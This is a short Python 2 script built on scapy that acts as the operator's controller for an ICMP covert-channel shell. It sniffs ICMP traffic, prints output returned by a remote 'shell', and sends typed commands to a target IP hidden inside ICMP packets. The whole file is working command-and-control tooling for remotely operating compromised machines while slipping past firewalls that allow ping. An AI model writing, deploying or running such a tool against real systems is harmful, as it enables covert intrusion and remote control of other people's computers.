from scapy.all import *
import sys

interface = sys.argv[1]
dstip = sys.argv[2]

def pkt_callback(pkt):
#    pkt.show() # debug statement
    if pkt[Raw].load == "ECMD":
        print "Enter command to execute:"
        cmd = raw_input()
        packet = IP(dst=dstip)/ICMP()/cmd
        send(packet)
        #packet.show()
#       print pkt[Raw].load
        print "[!] Command Sent"
    else:
        print "[!] We got a connection from the shell, reading packet..."
        print pkt[Raw].load
        print "Enter command to execute:"
        cmd = raw_input()
        packet = IP(dst=dstip)/ICMP()/cmd
        send(packet)
        print "[!] Command Sent"
        #packet.show()

sniff(iface=interface, prn=pkt_callback, filter="icmp", store=0)
